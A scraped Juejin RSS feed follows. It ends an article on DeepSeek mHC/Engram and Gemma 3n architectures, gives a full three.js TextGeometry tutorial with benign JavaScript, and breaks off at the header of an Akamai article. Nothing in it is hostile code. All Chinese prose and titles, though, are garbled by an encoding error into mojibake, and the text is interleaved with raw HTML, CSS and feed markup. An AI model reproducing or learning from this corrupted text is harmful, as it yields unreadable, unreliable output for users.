<p>è¿™ç§åˆ»æ„è®¾è®¡çš„ç¨€ç–æ€§ï¼Œåœ¨å·¥ç¨‹å±‚é¢æ„æˆäº†å¯¹æ®‹å·®è·¯å¾„èƒ½é‡çš„ç‰©ç†çº¦æŸï¼Œä»è€Œéšå¼æŠ‘åˆ¶äº†æ–¹å·®çˆ†ç‚¸ã€‚è¿™æ­£æ˜¯â€œå› ç®—åŠ›å—é™è€Œè¢«è¿«ç²¾ç®€ï¼Œå´æ„å¤–è¾¾æˆç¨³å®šæå‡â€çš„å…¸å‹å·¥ç¨‹æ‚–è®ºå¼çªç ´ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/223e68eb1b87474caf5d456299348960~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006333&amp;x-signature=yWOUflwxXigchxH3RDkRORgIZ%2FM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å›¾8. AltUp çš„ Predict-and-Compute æµç¨‹ç¤ºæ„å›¾ã€‚åŸæœ¬ d ç»´çš„å®½å‘é‡è¢«éšå¼æ“ä½œï¼Œé€šè¿‡æ‰©å±•ç®—å­ï¼ˆUp-projectionï¼‰å’Œç¨€ç–ä¿®æ­£æ¥æ¨¡æ‹Ÿå®½ç½‘ç»œçš„æ•ˆæœã€‚</p>
<h3 data-id="heading-7">2.3 mHC çš„æµå½¢çº¦æŸ</h3>
<p>DeepSeek ä¸»åŠ¨è¿å‘è¿™ä¸€æŒ‘æˆ˜ã€‚mHC æŒ‡å‡ºï¼Œè‹¥çœŸæ¬²è®­ç»ƒç¨ å¯†çš„è¶…å®½ç½‘ç»œï¼ŒåŠ¿å¿…è¦å¯¹æƒé‡çŸ©é˜µæ–½åŠ æµå½¢çº¦æŸã€‚</p>
<p>å…¶æœ¬è´¨åœ¨äºï¼Œå°†æƒé‡çŸ©é˜µæŠ•å½±è‡³ Stiefel æµå½¢ï¼ˆï¼‰æˆ–å…¶å®ƒç‰¹å®šæµå½¢ï¼Œä»¥ç²¾å‡†è°ƒæ§å¥‡å¼‚å€¼çš„åˆ†å¸ƒå½¢æ€ã€‚</p>
<p>åœ¨è®ºæ–‡çš„æ–¹æ³•è®ºç« èŠ‚ä¸­ï¼ŒDeepSeek å¯¹æ­¤è¿‡ç¨‹è¿›è¡Œäº†ç³»ç»Ÿæ¨æ¼”ï¼šæ¯æ¬¡å‚æ•°æ›´æ–°åï¼Œå‡æ˜¾å¼å¼•å…¥ä¸€æ­¥æŠ•å½±æ“ä½œï¼ˆå¦‚å€ŸåŠ© Sinkhorn-Knopp ç®—æ³•å®æ–½å½’ä¸€åŒ–ï¼‰ï¼Œå¼ºåˆ¶å°†æƒé‡çŸ©é˜µæ‹‰å›æµå½¢çº¦æŸæµå½¢ã€‚</p>
<p>è¯¥æœºåˆ¶ä¸»åŠ¨é‡å¡‘äº†æƒé‡çŸ©é˜µçš„å‡ ä½•ç»“æ„ï¼Œä½¿ Jacobian çŸ©é˜µçš„å¥‡å¼‚å€¼è¢«çº¦æŸäº 1 é™„è¿‘ï¼Œä»æ ¹æœ¬ä¸Šé‡å»ºäº†å®½ç½‘ç»œçš„æ’ç­‰æ˜ å°„èƒ½åŠ›ï¼Œæ˜¾è‘—æå‡è®­ç»ƒè¿‡ç¨‹çš„æ”¶æ•›ç¨³å®šæ€§ã€‚</p>
<p>DeepSeek çš„æ´è§æå…·å‰ç»è§†é‡ï¼šAltUp å®è´¨ä¸Šæ˜¯â€œå®½ç½‘ç»œâ€æ¡†æ¶ä¸‹çš„ä¸€ç§ç¨€ç–å˜ä½“ï¼Œè€Œ mHC åˆ™æ„å»ºäº†æ“æ§â€œå®½ç½‘ç»œâ€çš„æ™®é€‚æ•°å­¦èŒƒå¼ã€‚</p>
<p>æœªæ¥ï¼Œæˆ‘ä»¬æˆ–å¯å½»åº•æ‘’å¼ƒ AltUp æ‰€ä¾èµ–çš„å¤æ‚ç¨€ç–æ©ç æœºåˆ¶ï¼Œè½¬è€Œç›´æ¥è®­ç»ƒå‡ºæå®½ã€ææµ…ã€æ¨ç†æ•ˆç‡æé«˜çš„ä¸»å¹²ç½‘ç»œã€‚</p>
<h2 data-id="heading-8">03.å¼¹æ€§æ¨ç†çš„ç»ˆå±€</h2>
<p>Gemma 3n çš„æ ¸å¿ƒæŠ€æœ¯æ”¶å®˜ä¹‹ä½œï¼Œæ­£æ˜¯ MatFormerã€‚</p>
<p>æ ¹æ® Gemma 3n Model Overview æ–‡æ¡£ ï¼ŒGoogle æ¸…æ™°æ­ç¤ºäº†å…¶â€œå¥—å¨ƒâ€æ¶æ„ï¼šâ€ŒE4B æ¨¡å‹å®Œæ•´ç»§æ‰¿äº† E2B æ¨¡å‹çš„æ‰€æœ‰å‚æ•°â€Œã€‚</p>
<p>è¿™ä¸€æ¶æ„çš„ç†è®ºæ ¹åŸºï¼Œæºè‡ª MatFormer è®ºæ–‡æ‰€æå‡ºçš„ â€ŒMatryoshkaï¼ˆä¿„ç½—æ–¯å¥—å¨ƒï¼‰èŒƒå¼â€Œâ€”â€”åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œä¸å†èšç„¦äºå•ä¸€è§„æ¨¡çš„æ¨¡å‹ï¼Œè€Œæ˜¯ååŒä¼˜åŒ–ä¸€ä¸ªåŒ…å«å¤šå±‚æ¬¡åµŒå¥—å­æ¨¡å‹çš„è¶…ç½‘ç»œã€‚</p>
<p>MatFormer çš„çªç ´æ€§è´¡çŒ®ï¼Œåœ¨äºå¯¹ Transformer Block å†…éƒ¨ç»“æ„çš„é‡æ„ï¼šå®ƒå¼•å…¥äº†â€ŒåµŒå¥—å‰é¦ˆç½‘ç»œï¼ˆNested FFNï¼‰â€Œï¼Œä½¿å•ä¸ªæ¨¡å—å¯åŠ¨æ€é€‚é…ä¸åŒå‚æ•°è§„æ¨¡ï¼Œå®ç°é«˜æ•ˆå¤šç²’åº¦æ¨ç†ä¸è®­ç»ƒã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9902efaef1b346f5b687bf8fe7c00c45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006333&amp;x-signature=MpdRjxlrEVP%2FV5ICbvJJj5v7V2Q%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å›¾9. MatFormer çš„æ¶æ„åŸç†å›¾ã€‚å·¦ä¾§å±•ç¤ºäº† MatFormer Block å†…éƒ¨çš„åµŒå¥— FFN è®¾è®¡ï¼Œæƒé‡çŸ©é˜µè¢«ç‰©ç†åˆ’åˆ†ä¸ºå¤šä¸ªå±‚çº§ï¼›å³ä¾§å±•ç¤ºäº†è®­ç»ƒå’Œæ¨ç†æ—¶çš„â€œMix'n'Matchâ€æœºåˆ¶ï¼Œå³ä¸åŒå±‚çº§çš„å°æ¨¡å‹å¯ä»¥ç›´æ¥ä»å¤§æ¨¡å‹ä¸­æå–å‡ºæ¥ä½¿ç”¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1a88ace376749db8c75898751ca4e2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006333&amp;x-signature=6BxYec6GAi5KokS%2BTYPMV6ilavo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¸ºäº†è®©å¥—å¨ƒç»“æ„ä¸­çš„æ¯ä¸€å±‚éƒ½èƒ½é«˜æ•ˆè¿ä½œï¼ŒMatFormer åœ¨è®­ç»ƒä¸­è®¾è®¡äº†ä¸€ç§ç‹¬ç‰¹çš„è”åˆä¼˜åŒ–ç­–ç•¥ã€‚</p>
<p>è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿä¼šéšæœºæŠ½å–ä¸åŒçš„å­æ¨¡å‹ï¼Œå¹¶é’ˆå¯¹æ¯ä¸ªè¢«é€‰ä¸­çš„å­ç½‘ç»œå•ç‹¬è®¡ç®—æŸå¤±å‡½æ•°ã€‚è¿™ä¸€æœºåˆ¶çš„æœ¬è´¨ï¼Œæ˜¯åŒæ­¥æœ€å°åŒ–æ‰€æœ‰åµŒå¥—å­æ¨¡å‹ï¼ˆSub-modelsï¼‰çš„æ€»ä½“æŸå¤±ã€‚</p>
<p>è¯¥è®­ç»ƒèŒƒå¼è¿«ä½¿æ¨¡å‹å°†æœ€åŸºç¡€çš„é€šç”¨è¡¨å¾å‹ç¼©è‡³æ ¸å¿ƒå‚æ•°åŒºåŸŸï¼ˆå¦‚å‰æ•°ç™¾ä¸ªç¥ç»å…ƒï¼‰ï¼Œè€Œå°†é«˜ç»´ç»†èŠ‚ä¿¡æ¯åˆ†é…è‡³æ‰©å±•å‚æ•°ç»´åº¦ã€‚</p>
<p>è¿™ä¹Ÿæ­£æ˜¯ Gemma 3n èƒ½å¤Ÿå®ç° â€Œ"Select parameters and assemble models in intermediate sizes"â€Œï¼Œå¹¶åœ¨ 2B è‡³ 4B å‚æ•°åŒºé—´å†…è¾¾æˆå¹³æ»‘æ€§èƒ½ä¼¸ç¼©çš„æ ¹æœ¬åŸå› ã€‚</p>
<p>DeepSeek çš„ mHCã€Engram ä¸ Google çš„ Gemma 3nï¼Œè™½è¯ç”Ÿäºä¸åŒé˜¶æ®µï¼Œå´å„è‡ªç‹¬ç«‹ç ´è§£äº†ç«¯ä¾§ AI ä¸å¯èƒ½ä¸‰è§’çš„ç“¶é¢ˆã€‚</p>
<p>å®¹é‡ï¼ˆCapacityï¼‰â€Œï¼šDeepSeek mHC é€šè¿‡æµå½¢çº¦æŸï¼ŒæˆåŠŸè®­ç»ƒå‡ºè¶…å®½çº¿æ€§å±‚ï¼Œå¹¶ç»“åˆ Google AltUp çš„ç¨€ç–è®¡ç®—æ¶æ„ï¼ŒåŒ–è§£äº†å¤§å®¹é‡éœ€æ±‚ä¸æœ‰é™ç®—åŠ›ä¹‹é—´çš„å†²çªã€‚</p>
<p>è®°å¿†ï¼ˆMemoryï¼‰â€Œï¼šDeepSeek Engram å±•ç°äº†é™æ€æŸ¥è¡¨æœºåˆ¶çš„æè‡´æ•ˆç‡ï¼ŒååŒ Google PLE çš„æ˜¾å­˜å¸è½½æ–¹æ¡ˆï¼Œçªç ´äº†æµ·é‡çŸ¥è¯†å­˜å‚¨ä¸æœ‰é™æ˜¾å­˜çš„é™åˆ¶ã€‚</p>
<p>é€‚åº”æ€§ï¼ˆAdaptabilityï¼‰â€Œï¼šMatFormer ä»¥åµŒå¥—æƒé‡ç»“æ„ä¸è”åˆä¼˜åŒ–æœºåˆ¶ï¼Œå®ç°äº†å•ä¸€æ¨¡å‹åœ¨å¼‚æ„ç¡¬ä»¶ç¯å¢ƒä¸­çš„åŠ¨æ€é€‚é…ï¼Œå¼¥åˆäº†æ¨¡å‹ç»Ÿä¸€æ€§ä¸ç¡¬ä»¶ç¢ç‰‡åŒ–ä¹‹é—´çš„é¸¿æ²Ÿã€‚</p>
<h2 data-id="heading-9">04.æ€»ç»“</h2>
<p>DeepSeek mHC ä¸ Engram çš„é—®ä¸–ï¼Œä¸ºè¡Œä¸šåˆ’ä¸‹äº†ä¸€é“æ¸…æ™°çš„åˆ†æ°´å²­ï¼šå‚æ•°è§„æ¨¡çš„æ— è„‘æ‰©å¼ ï¼Œæ­£é€¼è¿‘å…¶è¾¹é™…æ”¶ç›Šçš„æé™ã€‚</p>
<p>Google äº 2025 å¹´åœ¨ Gemma 3n ä¸Šå®è¯äº†â€œè®¡ç®—ä¸å­˜å‚¨åˆ†ç¦»â€åœ¨å·¥ç¨‹è½åœ°å±‚é¢çš„å¯è¡Œæ€§ï¼›è€Œ DeepSeek åœ¨ 2026 å¹´åˆï¼Œåˆ™ä»¥ä¸¥è°¨çš„æ•°å­¦æ¨æ¼”æ­ç¤ºï¼šè¿™æ¡è·¯å¾„ä¸ä»…å¯è¡Œï¼Œæ›´è•´å«æ›´é«˜çš„è¿ç®—æ•ˆç‡ã€‚</p>
<p>äºŒè€…å¼‚æ›²åŒå·¥ï¼Œå…±åŒæŒ‡å‘ä¸€ä¸ªè¶‹åŠ¿â€”â€”ç«¯ä¾§æ¨¡å‹çš„æ¶æ„æ­£ç»å†æ ¹æœ¬æ€§é‡æ„ã€‚å®ƒå°†ä¸å†ä¾é™„äºå°é—­çš„ç«¯åˆ°ç«¯ç¥ç»ç½‘ç»œï¼Œè€Œæ˜¯èœ•å˜ä¸ºâ€œé€»è¾‘æ ¸å¿ƒï¼ˆNPUï¼‰+ é™æ€çŸ¥è¯†åº“ï¼ˆRAMï¼‰â€è¿™ä¸€é«˜åº¦ååŒçš„ç²¾å¯†ç³»ç»Ÿã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer"><strong>æ›´å¤šAIå¤§æ¨¡å‹å­¦ä¹ è§†é¢‘åŠèµ„æºï¼Œéƒ½åœ¨æ™ºæ³ŠAIã€‚</strong></a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[3Då­—ä½“TextGeometry]]></title>    <link>https://juejin.cn/post/7595043061729165346</link>    <guid>https://juejin.cn/post/7595043061729165346</guid>    <pubDate>2026-01-14T14:42:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595043061729165346" data-draft-id="7595040803581034511" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="3Då­—ä½“TextGeometry"/> <meta itemprop="keywords" content="å‰ç«¯,WebGL,three.js"/> <meta itemprop="datePublished" content="2026-01-14T14:42:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çƒ›é˜´"/> <meta itemprop="url" content="https://juejin.cn/user/950397795841032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            3Då­—ä½“TextGeometry
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/950397795841032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çƒ›é˜´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:42:09.000Z" title="Wed Jan 14 2026 14:42:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. å¼•å…¥å­—ä½“åŠ è½½å™¨</h2>
<p>ç”±äº <code>TextGeometry</code> ä¸æ˜¯æ ¸å¿ƒåº“çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬éœ€è¦å•ç‹¬å¼•å…¥ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">FontLoader</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/loaders/FontLoader.js'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TextGeometry</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/geometries/TextGeometry.js'</span>;
</code></pre>
<h2 data-id="heading-1">2. åŠ è½½ JSON å­—ä½“å¹¶åˆ›å»º</h2>
<p>Three.js ä¸ç›´æ¥è¯»å– <code>.ttf</code>ï¼Œå®ƒè¯»å–çš„æ˜¯ä¸“ç”¨çš„ JSON å­—ä½“æ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'three'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">FontLoader</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/loaders/FontLoader.js'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TextGeometry</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/geometries/TextGeometry.js'</span>;
<span class="hljs-keyword">import</span> local_font <span class="hljs-keyword">from</span> <span class="hljs-string">'../../assets/font/helvetiker_bold.typeface.json'</span>;

<span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>();
scene.<span class="hljs-property">background</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Color</span>(<span class="hljs-number">0x222222</span>); <span class="hljs-comment">// æ·±ç°è‰²èƒŒæ™¯</span>

<span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(<span class="hljs-number">75</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">1000</span>);
camera.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = <span class="hljs-number">5</span>;

<span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>({ <span class="hljs-attr">antialias</span>: <span class="hljs-literal">true</span> });
renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);

<span class="hljs-keyword">const</span> loader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FontLoader</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¼€å§‹åŠ è½½å­—ä½“...'</span>);

<span class="hljs-keyword">let</span> font = loader.<span class="hljs-title function_">parse</span>(local_font);
<span class="hljs-keyword">const</span> textGeometry = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextGeometry</span>(<span class="hljs-string">'Hello Three.js!'</span>, {
    <span class="hljs-attr">font</span>: font,
    <span class="hljs-attr">size</span>: <span class="hljs-number">1</span>,
    <span class="hljs-attr">depth</span>: <span class="hljs-number">0.5</span>,
    <span class="hljs-attr">curveSegments</span>: <span class="hljs-number">12</span>,
    <span class="hljs-attr">bevelEnabled</span>: <span class="hljs-literal">false</span>,
});

textGeometry.<span class="hljs-title function_">center</span>();

<span class="hljs-keyword">const</span> textMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshNormalMaterial</span>();
<span class="hljs-keyword">let</span> textMesh = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(textGeometry, textMaterial);
textMesh.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// ç¡®ä¿åœ¨åŸç‚¹</span>
scene.<span class="hljs-title function_">add</span>(textMesh);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ–‡å­—ç½‘æ ¼å·²æ·»åŠ åˆ°åœºæ™¯'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">animate</span>(<span class="hljs-params"/>) {
    <span class="hljs-title function_">requestAnimationFrame</span>(animate);

    <span class="hljs-keyword">if</span> (textMesh) {
        textMesh.<span class="hljs-property">rotation</span>.<span class="hljs-property">y</span> += <span class="hljs-number">0.01</span>;
    }

    renderer.<span class="hljs-title function_">render</span>(scene, camera);
}
<span class="hljs-title function_">animate</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'åŠ¨ç”»å¾ªç¯å·²å¯åŠ¨'</span>);
</code></pre>
<p>ğŸ“‚Â <strong>æ ¸å¿ƒä»£ç ä¸å®Œæ•´ç¤ºä¾‹ï¼š</strong> Â Â Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fqq790git%2Fmy-three-app.git" target="_blank" title="https://github.com/qq790git/my-three-app.git" ref="nofollow noopener noreferrer">my-three-app</a></p>
<h2 data-id="heading-2">æ€»ç»“</h2>
<p><strong>å¦‚æœä½ å–œæ¬¢æœ¬æ•™ç¨‹ï¼Œè®°å¾—ç‚¹èµ+æ”¶è—ï¼å…³æ³¨æˆ‘è·å–æ›´å¤šThree.jså¼€å‘å¹²è´§</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ†æ»¡å¾ªç¯ï¼šAkamai çš„æ¼”è¿›å¦‚ä½•ä¸º AI æ¨ç†æ—¶ä»£å¥ å®šåŸºçŸ³]]></title>    <link>https://juejin.cn/post/7594851429162926114</link>    <guid>https://juejin.cn/post/7594851429162926114</guid>    <pubDate>2026-01-14T13:13:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594851429162926114" data-draft-id="7594813727054495778" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ†æ»¡å¾ªç¯ï¼šAkamai çš„æ¼”è¿›å¦‚ä½•ä¸º AI æ¨ç†æ—¶ä»£å¥ å®šåŸºçŸ³"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,äº‘è®¡ç®—"/> <meta itemprop="datePublished" content="2026-01-14T13:13:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AKAMAI"/> <meta itemprop="url" content="https://juejin.cn/user/829502942352628"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ†æ»¡å¾ªç¯ï¼šAkamai çš„æ¼”è¿›å¦‚ä½•ä¸º AI æ¨ç†æ—¶ä»£å¥ å®šåŸºçŸ³
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/829502942352628/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AKAMAI
